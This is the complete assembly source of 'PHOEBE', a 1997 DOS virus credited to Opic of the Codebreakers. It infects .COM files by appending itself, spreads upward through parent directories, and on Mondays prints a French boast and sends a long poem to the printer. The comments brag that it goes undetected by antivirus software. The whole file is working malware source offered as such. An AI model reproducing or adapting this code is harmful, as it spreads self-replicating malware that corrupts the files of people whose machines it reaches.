


;PHOEBE
;coded by Opic of the Codebreakers
;PHOEBE is an appending .com infector with DT via a dotdot routine
;infection criteria is  met on a moday once all files that are capable of
;being infected by PHOEBE are, a payload is delivered:
;the monitor will print a message to the screen(in the French) which
;translates to;"Indroducing PHOEBE, she was coded in the heart of midwest
;america in the autumn of ninteen ninty-seven by Opic of The Codebreakers"
;along with a text string which will be printed to the printer. Thanx go
;out to:Spo0ky,Arsonic,and Sea4 for which without their help Phoebe whould
;not be what she is today. PHOEBE can be assembled using a86 V4.02
;it should be noted that phoebe has no anti-av routines, yet is still
;remains undetectable by most av software. a testament to the inconsistancy 
;of many av scanners, specifically windows95 scanners.
                               
                                  

db 0e9h,0,0                   ;jump to virus code..


start_of_PHOEBE:

        call delta            ;get delta offset to get # of byte virus moved down

 delta:
        pop bp                ; call a pop register to get the ip back into register
        sub bp,offset delta   ; we subtract the offset delta from bp(ip)
        mov cx,3
        mov di,100h
        lea si,[bp+buffer]
        rep movsb
        jmp find_first   ;jump to find the first file

find_first:
        mov ah,4eh       ;find's first file in the starting directory..
        mov cx,7
        lea dx,[bp+filespec]
        int 21h
        jnc open         ;one found.. then infect da 
        jmp dir_loopy    ;otherwise change directory

dir_loopy:
        lea dx,[bp+dotdot]
        mov ah, 3bh           ;int for chdir
        int 21h
        jnc find_first        ;find first file in new directory
        jmp check_payload ; we finished spreading so we check payload criteria

find_next:
        mov ah, 4Fh     ;find next..
        int 21h
        jnc open        ;one found.. INFECT IT!
        jmp dir_loopy   ;otherwise we do a cd..

open:
        mov ax,3d02h    ;open file
        mov dx,9eh      ;get the info from the dta
        int 21h

        mov bx,ax

        mov ah,3fh      ;read from file
        mov cx,3        ;3 bytes
        lea dx,[bp+buffer]
        int 21h
        mov ax,word ptr[80h + 1ah]
        sub ax,end_of_PHOEBE - start_of_PHOEBE + 3
        cmp ax,word ptr[bp+buffer+1]
        je bomb_it_out
        mov ax,word ptr[80h + 1ah]
        sub ax,3
        mov word ptr[bp+new_three+1],ax
        mov ax,4200h
        xor cx,cx
        xor dx,dx
        int 21h
        mov ah,40h
        lea dx,[bp+new_three]
        mov cx,3
        int 21h
        mov ax,4202h
        xor cx,cx
        xor dx,dx
        int 21h
        mov ah,40h
        lea dx,[bp+start_of_PHOEBE]
        mov cx,end_of_PHOEBE - start_of_PHOEBE
        int 21h
        jmp bomb_it_out

        bomb_it_out:  ;closes the file.. 
        mov ah,3fh    ;close file
        int 21h

        jmp find_next ;find another..

check_payload:
        mov ah,2ah  ;gets system date
        int 21h     ;opens it 
        cmp al,001h ;compares, is it monday?
        je payload  ; if so, we got shit to do
        jmp get_out ; if not then we chill till Mon.

payload:
        mov ah,09h   ; Fuction 09h: Print String to standard output
        lea dx,screen ; Start of '$' terminated string
        int 21h       

        mov ah,01h   ;begin of printer sect of payload
        mov dx,0h
        int 17h     ;int for initializing printer

        lea si,string1
        mov cx,String1Len
        PrintStr:
        mov ah,00h
        lodsb
        int 17h
        loop PrintStr

Get_out:
          lea  di,100h
          jmp  di

new_three         db  0e9h,0,0
filespec          db  '*.com',0
dotdot            db  '..',0
screen            db  "Voila PHOEBE! Elle etait code' dans la coeur de ,",10,13
screen2           db  "l'amerique midwest a l'automne, dix-neuf cent",10,13
screen3           db  'quatre-vingt-dix-sept, par Opic des Codebreakers',10,13,'$'
;You have to have the "$" at the end of all the text you want to print
                                                                     
String1Len        EQU EndStr1-String1
String1           db  '*************************PHOEBE*************************',0dh,0ah
                  db  'Phoebe: high school knockout, better take our MONDAY to',0dh,0ah                                                   
                  db  'the tuesday prize fighter(you were a cab driver off on',0dh,0ah
                  db  'the distance).youre a runner or a lover:sacred taylor',0dh,0ah
                  db  'set our records straight one lost two late,im a little',0dh,0ah                                                       
                  db  'off time so set your ticker to mine:',0dh,0ah                                                             
                  db  'id love to have my halo of social grace recrowned.',0dh,0ah                                                       
                  db  '(desert island ect.) home to ill will and',0dh,0ah                                                        
                  db  'misrepresentation. barter with me now mexico, i demand',0dh,0ah                                                         
                  db  'it.come bluebeard & red blood-we are life-even in our',0dh,0ah                                                       
                  db  'tied down mishaps. we are life; endure us. dead seven',0dh,0ah                                                        
                  db  'year old run over by a bus while stealing your first',0dh,0ah                                                        
                  db  'and only bicycle; endure. this is life even in my wine',0dh,0ah
                  db  'glass even in my ever faltering and constant doubt we',0dh,0ah
                  db  'are here, this is it, endure. even in on our toilet',0dh,0ah
                  db  'in the morning or in your shitbox or motel, you have',0dh,0ah
                  db  'made it-rejoice!-the ground will open up on us even',0dh,0ah
                  db  'before this glass is finished. this year will end for',0dh,0ah
                  db  'most of us.salt touches the ground, athens have we',0dh,0ah
                  db  'lost quite yet? savagly speared we went down quietly?',0dh,0ah
                  db  'giving up our youth or even worse our spirit so',0dh,0ah
                  db  'daintily as a beauty queen shits at midnight? was no',0dh,0ah
                  db  'one watching? listening? tell me athens: are we',0dh,0ah
                  db  'christians and lions? have i got my history all wrong?',0dh,0ah
                  db  'from the first to the last or one year past: "are these',0dh,0ah
                  db  'the depths of despair so unevenly documented in its',0dh,0ah
                  db  'text?".for once athens history repeats itself.tell me',0dh,0ah
                  db  'what do you think of our football games? are our glory',0dh,0ah
                  db  'days over? is america doomed with pre-ejaculation? i',0dh,0ah
                  db  'must know. slap me and tell me im like all the rest,',0dh,0ah
                  db  'athens,id feel so much better if you did.am i a thief',0dh,0ah
                  db  'stealing red robed memory? am i: train through a',0dh,0ah
                  db  'tunnel? rocketship blasting off? the washington',0dh,0ah
                  db  'monument? i bet i am.i am wimpering under your window',0dh,0ah
                  db  'sill or whispering to your pillowed ear:rejoice! we are',0dh,0ah
                  db  'famous watchers.sewer of amber letters, lips sewed a',0dh,0ah
                  db  'thread of truth to your tongue.i named and numbered my',0dh,0ah
                  db  'system the whole world over,and you?you got flowers and',0dh,0ah
                  db  'chocolates.like a steel warehouse summer turned calcium',0dh,0ah
                  db  'to carbon.',0dh,0ah
                  db  '****coded/copyrighted:Opic*********Codebreakers,1997****',0Ch
EndStr1:
buffer            db  0cdh,20h,0
end_of_PHOEBE:
